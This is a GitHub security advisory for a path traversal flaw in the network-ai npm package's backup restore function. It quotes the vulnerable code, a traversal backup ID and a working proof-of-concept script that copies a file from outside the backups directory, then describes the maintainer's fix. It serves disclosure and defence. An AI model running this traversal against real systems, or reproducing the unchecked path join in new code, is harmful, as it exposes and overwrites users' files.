# [M] Network-AI: EnvironmentManager.restore() backup ID path traversal copies arbitrary directories into environment data

## Summary
Severity: Medium
Advisory: GHSA-48x2-6pr9-2jjf
CWE: CWE-22, CWE-23
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-48x2-6pr9-2jjf
Type: github-advisory

## Affected
- npm: `network-ai` — affected >=0 <5.12.2

## Details
### Summary
`EnvironmentManager.restore(env, backupId)` computes the backup path with `join(envDir, '.backups', backupId)` and only checks that this path exists. It does not resolve the result or verify that it remains under `data/<env>/.backups`.

A caller can pass a traversal backup ID such as `../../../outside/source-dir` to restore files from an arbitrary directory into the target environment data directory. Confirmed in Network-AI 5.12.1.

### Details
`restore()` builds `backupPath` directly from caller-controlled `backupId`:

```ts
restore(env: EnvName, backupId: string): RestoreResult {
  const envDir = this.getDataDir(env);
  const backupsDir = join(envDir, '.backups');
  const backupPath = join(backupsDir, backupId);

  if (!existsSync(backupPath)) {
    throw new Error(`Backup '${backupId}' not found for environment '${env}'`);
  }

  this.backup(env);

  const files = this._collectBackupFiles(backupPath);
  let restored = 0;
  for (const rel of files) {
    if (rel === '_manifest.json') continue;
    const src = join(backupPath, rel);
    const dst = join(envDir, rel);
    try {
      mkdirSync(join(envDir, rel.includes('/') ? rel.substring(0, rel.lastIndexOf('/')) : '.'), { recursive: true });
      copyFileSync(src, dst);
      restored++;
    } catch { /* skip */ }
  }

  return { backupId, env, filesRestored: restored };
}
```

There is no resolved containment check that ensures `backupPath` remains under `backupsDir`.

Default CLI reachability exists through `network-ai env backup restore --env <env> --backup <id>`.

Affected source evidence:

- `lib/env-manager.ts:474-499` — vulnerable restore path construction and copy.
- `bin/cli.ts:441-458` — default CLI exposes restore with caller-controlled `--backup`.

### PoC
This PoC uses only temporary directories and restores `trust_levels.json` from an external directory into `data/dev`:

```bash
TMP=$(mktemp -d)
TMPBASE="$TMP" node -r ts-node/register/transpile-only - <<'TS'
const { EnvironmentManager } = require('./lib/env-manager');
const fs = require('fs');
const path = require('path');
const base = process.env.TMPBASE;
const data = path.join(base, 'data');
const source = path.join(base, 'outside', 'secret-src');

fs.mkdirSync(source, { recursive: true });
fs.writeFileSync(path.join(source, 'trust_levels.json'), '{"leaked":true}');

const mgr = new EnvironmentManager(data, {
  chain: ['dev', 'st'],
  gates: { dev: 'auto', st: 'auto' },
});

mgr.init('dev');
const backupId = path.relative(path.join(data, 'dev', '.backups'), source);
const result = mgr.restore('dev', backupId);
const restored = fs.readFileSync(path.join(data, 'dev', 'trust_levels.json'), 'utf8');

console.log(JSON.stringify({ backupId, filesRestored: result.filesRestored, restored }, null, 2));
fs.rmSync(base, { recursive: true, force: true });
TS
```

Observed result includes `backupId: "../../../outside/secret-src"`, `filesRestored: 1`, and restored content `{"leaked":true}`.

### Impact
A caller that can invoke backup restore can copy arbitrary readable directories into `data/<env>`, subject to process filesystem permissions. This can stage sensitive files into environment data/backup locations, overwrite environment configuration files if matching filenames exist, and break environment isolation. No RCE chain was confirmed.


---

### Resolution (maintainer)

**Fixed in [v5.12.2](https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2) (commit `a59c13a`).** Install: `npm install network-ai@5.12.2` — published to npm with provenance.

`restore()` now validates `backupId` against `/^[\w\-]+$/` and asserts `dirname(resolve(join(backupsDir, backupId))) === resolve(backupsDir)` before touching the filesystem. Backup IDs containing path separators or `..` are rejected, so a crafted ID can no longer copy directories from outside `.backups/` into the environment.

All 3,269 tests pass against the patched build. Thanks to @sondt99 for the responsible disclosure.

## References
- https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-48x2-6pr9-2jjf
- https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3
- https://github.com/Jovancoding/Network-AI
- https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2
